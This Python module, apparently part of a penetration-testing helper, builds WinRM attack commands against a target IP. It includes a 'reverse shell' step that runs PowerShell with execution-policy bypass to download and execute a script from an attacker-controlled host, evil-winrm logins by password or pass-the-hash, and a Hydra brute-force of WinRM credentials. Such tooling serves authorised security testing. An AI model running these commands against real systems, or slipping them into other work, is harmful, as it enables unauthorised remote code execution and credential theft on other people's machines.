from Modules.Imports.protocol_imports import *

def test_wsman(target_ip, open_ports):
    title = "Test WinRM Connectivity"
    content = f"Test-WSMan {target_ip}"
    run_command(title, content, target_ip, open_ports)

def execute_command_with_invoke_command(target_ip, open_ports):
    title = "Execute Command with Invoke-Command"
    content = (
        f"Invoke-Command -ComputerName {target_ip} -ScriptBlock {{ipconfig /all}} "
        f"[-Credential DOMAIN\\username]"
    )
    run_command(title, content, target_ip, open_ports)

def establish_reverse_shell(target_ip, open_ports):
    title = "Establish Reverse Shell"
    content = (
        f"Invoke-Command -ComputerName {target_ip} -ScriptBlock {{cmd /c "
        f"\"powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<YOUR-IP>:8080/ipst.ps1')\"}}"
    )
    run_command(title, content, target_ip, open_ports)

def connect_with_evil_winrm(target_ip, open_ports):
    title = "Connect with evil-winrm"
    content = (
        f"evil-winrm -i {target_ip} -u <username> -p <password>\n"
        f"evil-winrm -i {target_ip} -u <username> -H <hash>"
    )
    run_command(title, content, target_ip, open_ports)

def brute_force_winrm_with_hydra(target_ip, open_ports):
    title = "Brute-Force WinRM with Hydra"
    content = (
        f"hydra -L usernames.txt -P passwords.txt -vV {target_ip} winrm"
    )
    run_command(title, content, target_ip, open_ports)

def show_hacktricks_reference(target_ip, open_ports):
    title = "HackTricks Reference"
    content = (
        f"Visit the following link for more WinRM enumeration tips:\n\n"
        f"https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm"
    )
    run_command(title, content, target_ip, open_ports)
